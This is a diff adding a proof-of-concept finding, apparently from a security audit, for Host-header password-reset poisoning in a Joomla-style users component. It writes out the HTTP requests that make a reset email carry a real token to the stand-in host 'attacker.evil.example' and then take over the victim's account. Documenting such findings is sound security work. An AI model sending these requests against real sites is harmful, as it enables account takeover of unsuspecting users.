@@ -1,0 +1,20 @@
+### VULN-004 — Host-header password-reset-link poisoning -> ATO (consistent spoofed Host)
+
+### (1) attacker GETs the reset form under the spoofed Host (canonical SEF URL, so no redirect)
+GET /index.php/component/users/reset HTTP/1.1
+Host: attacker.evil.example
+# -> 200, form token scraped from this host-coherent session
+
+### (2) attacker POSTs the reset request for the VICTIM's email, same spoofed Host
+POST /index.php?option=com_users&task=reset.request HTTP/1.1
+Host: attacker.evil.example
+Content-Type: application/x-www-form-urlencoded
+Cookie: <attacker session from step 1>
+
+jform[email]=victim_<rand>@example.invalid&<csrf-token>=1
+# -> the victim is emailed a link on http://attacker.evil.example/... carrying the REAL token
+
+### (3) attacker replays the captured token on the REAL host to set a new password
+POST /index.php?option=com_users&task=reset.confirm HTTP/1.1   (jform[username], jform[token]=<captured>, <csrf>)
+POST /index.php?option=com_users&task=reset.complete HTTP/1.1  (jform[password1/2]=<attacker pw>, <csrf>)
+# -> victim password changed = account takeover
